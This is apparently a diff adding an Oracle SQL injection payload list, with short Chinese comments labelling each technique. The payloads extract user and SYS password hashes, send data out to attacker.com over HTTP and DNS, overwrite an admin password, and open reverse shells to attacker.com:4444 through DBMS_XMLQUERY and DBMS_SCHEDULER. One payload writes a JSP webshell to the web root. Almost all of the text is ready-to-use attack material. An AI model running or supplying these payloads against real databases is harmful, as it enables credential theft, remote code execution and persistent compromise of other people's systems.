@@ -1,0 +1,34 @@
+# Oracle - UNION 提取数据 (必须带 FROM dual)
+' UNION SELECT NULL,NULL,username,password FROM all_users--
+# Oracle - UNION 提取版本和数据库名
+' UNION SELECT NULL,banner,NULL,NULL FROM v$version--
+# Oracle - 报错注入 (CTXSYS.DRITHSX.SN 函数)
+' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT password FROM sys.user$ WHERE name='SYS'))--
+# Oracle - 报错注入 (UTL_INADDR.get_host_name)
+' AND 1=UTL_INADDR.get_host_name((SELECT password FROM sys.user$ WHERE name='SYS'))--
+# Oracle - 报错注入 (DBMS_XDB_VERSION)
+' AND (SELECT DBMS_XDB_VERSION.makeversioned((SELECT password FROM sys.user$ WHERE name='SYS')) FROM dual) IS NOT NULL--
+# Oracle - 盲注 (SUBSTR + DECODE)
+' AND (SELECT DECODE(SUBSTR(password,1,1),'A',(SELECT COUNT(*) FROM all_tables)) FROM sys.user$ WHERE name='SYS') IS NOT NULL--
+# Oracle - 延时注入 (DBMS_PIPE.RECEIVE_MESSAGE)
+' AND (SELECT CASE WHEN (SELECT user FROM dual)='SYS' THEN DBMS_PIPE.RECEIVE_MESSAGE(('a'),5) ELSE NULL END FROM dual) IS NOT NULL--
+# Oracle - 延时注入 (DBMS_LOCK.SLEEP)
+'; BEGIN DBMS_LOCK.SLEEP(5); END;--
+# Oracle - OOB DNS 外带数据 (UTL_HTTP)
+' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM sys.user$ WHERE name='SYS')) FROM dual--
+# Oracle - OOB DNS 外带数据 (UTL_INADDR)
+' UNION SELECT UTL_INADDR.get_host_address((SELECT password FROM sys.user$ WHERE name='SYS')||'.attacker.com') FROM dual--
+# Oracle - 堆叠查询修改管理员密码
+'; UPDATE sys.user$ SET password='hacked' WHERE name='ADMIN'; COMMIT--
+# Oracle - Java 存储过程命令执行
+'; DECLARE l_output DBMS_OUTPUT.CHARARR; l_lines INTEGER:=1000; BEGIN DBMS_JAVA.SET_OUTPUT(1000); DBMS_JAVA.GRANT_PERMISSION('SYS','java.io.FilePermission','<<ALL FILES>>','execute'); END;--
+# Oracle - DBMS_XMLQUERY 执行命令
+'; SELECT DBMS_XMLQUERY.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate ''create or replace function xx return varchar2 is language java name ''''Runtime.exec(''''/bin/bash -c bash$IFS-i$IFS>&$IFS/dev/tcp/attacker.com/4444$IFS<&1''''') return VARCHAR2;''''; end; commit;') FROM dual--
+# Oracle - 文件读取 (BFILENAME)
+' UNION SELECT BFILENAME('DIR_NAME','filename'),NULL FROM dual--
+# Oracle - 提取数据库链接 (横向移动)
+' UNION SELECT db_link,username,password,NULL,NULL FROM user_db_links--
+# Oracle - Scheduler 任务执行命令
+'; BEGIN DBMS_SCHEDULER.create_job(job_name=>'JOB',job_type=>'EXECUTABLE',job_action=>'/bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"',enabled=>TRUE); END;--
+# Oracle - UTL_FILE 文件写入 Webshell
+'; DECLARE f UTL_FILE.FILE_TYPE; BEGIN f:=UTL_FILE.FOPEN('WWWROOT','shell.jsp','w'); UTL_FILE.PUT_LINE(f,'<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'); UTL_FILE.FCLOSE(f); END;--
